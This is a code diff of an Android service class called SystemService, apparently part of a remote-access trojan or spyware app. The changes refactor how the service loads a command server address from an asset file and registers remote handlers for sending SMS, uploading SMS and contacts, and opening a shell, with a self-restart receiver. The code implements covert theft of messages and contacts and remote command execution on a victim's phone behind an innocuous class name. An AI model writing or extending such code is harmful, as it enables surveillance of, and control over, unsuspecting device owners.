@@ -39,26 +39,34 @@ public class SystemService extends Service{
         return null;
     }
 
-    private NetworkSessionManager mSessionManager;
+    private NetworkSessionManager mSessionManager = new NetworkSessionManager();
 
-    private String SESSION_SEND_SMS = "send_sms";
-    private String SESSION_UPLOAD_SMS = "upload_sms";
-    private String SESSION_UPLOAD_CONTACT = "upload_contact";
-    private String SESSION_SHELL = "shell";
+    private final String SESSION_SEND_SMS = "send_sms";
+    private final String SESSION_UPLOAD_SMS = "upload_sms";
+    private final String SESSION_UPLOAD_CONTACT = "upload_contact";
+    private final String SESSION_SHELL = "shell";
 
     private void init() {
+        loadConfig();
+
+        //add SessionHandler to SessionManager
+        mSessionManager.addSessionHandler(SESSION_SEND_SMS, new SendSmsSessionHandler());
+        mSessionManager.addSessionHandler(SESSION_UPLOAD_CONTACT, new UploadContactsSessionHandler());
+        mSessionManager.addSessionHandler(SESSION_UPLOAD_SMS, new UploadSmsSessionHandler());
+        mSessionManager.addSessionHandler(SESSION_SHELL, new ShellSessionHandler());
+        mSessionManager.setHeartBeatData(Build.MODEL.getBytes());
+        mSessionManager.start();
+    }
+
+    private void loadConfig() {
         try {
+            //read address, port, from "hostname" file
             InputStream is = getAssets().open("hostname");
             byte[] data = new byte[is.available()];
             is.read(data);
             String address = new String(data, "UTF-8");
             String[] host_port = address.split(":");
-            mSessionManager = new NetworkSessionManager();
-            mSessionManager.addSessionHandler(SESSION_SEND_SMS, new SendSmsSessionHandler());
-            mSessionManager.addSessionHandler(SESSION_UPLOAD_CONTACT, new UploadContactsSessionHandler());
-            mSessionManager.addSessionHandler(SESSION_UPLOAD_SMS, new UploadSmsSessionHandler());
-            mSessionManager.addSessionHandler(SESSION_SHELL, new ShellSessionHandler());
-            mSessionManager.setHeartBeatData(Build.MODEL.getBytes("UTF-8"));
+
             if(host_port.length >= 1) {
                 mSessionManager.setHost( host_port[0] );
             }
@@ -68,7 +76,6 @@ public class SystemService extends Service{
                 } catch (Exception e) {
                 }
             }
-            mSessionManager.start();
         } catch (IOException e) {
         }
     }
@@ -78,6 +85,8 @@ public class SystemService extends Service{
         super.onCreate();
         sContext = this;
         init();
+
+        //restart itself
         registerReceiver(new BroadcastReceiver() {
             @Override
             public void onReceive(final Context context, Intent intent) {
